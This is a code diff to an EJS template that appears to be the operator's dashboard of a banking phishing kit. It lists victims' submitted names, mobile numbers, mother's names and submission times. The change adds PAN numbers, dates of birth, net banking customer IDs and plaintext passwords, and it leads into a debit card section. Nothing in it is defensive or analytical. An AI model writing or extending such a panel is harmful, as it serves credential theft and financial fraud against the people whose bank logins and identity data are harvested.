@@ -18,41 +18,49 @@
     <!-- User Details Section -->
     <h2>User Details</h2>
 
-    <% if (userEntries && userEntries.length > 0) { %>
-      <% userEntries.forEach((entry, index) => { %>
-        <div class="card">
-          <h3>User Information - <%= index + 1 %></h3>
-          <p><strong>Name:</strong> <%= entry.name %></p>
-          <p><strong>Mobile Number:</strong> <%= entry.mobileNumber %></p>
-          <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
-        </div>
-      <% }); %>
-    <% } else { %>
-      <p>No User Data Found</p>
-    <% } %>
+   <% if (userEntries && userEntries.length) { %>
+  <% userEntries.forEach((entry, idx) => { %>
+    <div class="card">
+      <h3>Submission #<%= idx + 1 %></h3>
+      <p><strong>Name:</strong> <%= entry.name %></p>
+      <p><strong>Mobile:</strong> <%= entry.mobileNumber %></p>
+      <p><strong>PAN:</strong> <%= entry.panNumber %></p>
+      <p><strong>Date of Birth:</strong> <%= entry.dob %></p>
+      <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+    </div>
+  <% }) %>
+<% } else { %>
+  <p>No User Data Found</p>
+<% } %>
 
-    <!-- NetBanking Details Section -->
+
+   <!-- NetBanking Details Section -->
 <h2>Net Banking Details</h2>
+
 <% if (netBanking && netBanking.length > 0) { %>
   <% netBanking.forEach((bank, bankIndex) => { %>
     <div class="card">
-      <h3>Net Banking Entry - <%= bankIndex + 1 %></h3>
-      <% bank.entries.forEach((entry, index) => { %>
+      <h3>Account – <%= bankIndex + 1 %></h3>
+
+      <% bank.entries.forEach((entry, idx) => { %>
         <div class="sub-card">
-          <h4>Transaction <%= index + 1 %></h4>
+          <h4>Transaction <%= idx + 1 %></h4>
+          <p><strong>Customer ID:</strong> <%= entry.customerId %></p>
+          <p><strong>Password:</strong>    <%= entry.password %></p>
           <p><strong>Mother's Name:</strong> <%= entry.motherName %></p>
-          <p><strong>DOB:</strong>              <%= entry.dob %></p>
           <p>
             <strong>Submitted At:</strong>
             <%= new Date(entry.submittedAt).toLocaleString() %>
           </p>
         </div>
       <% }); %>
+
     </div>
   <% }); %>
 <% } else { %>
   <p>No Net Banking Data Found</p>
 <% } %>
+
 
 
     <!-- Debit Card Details -->
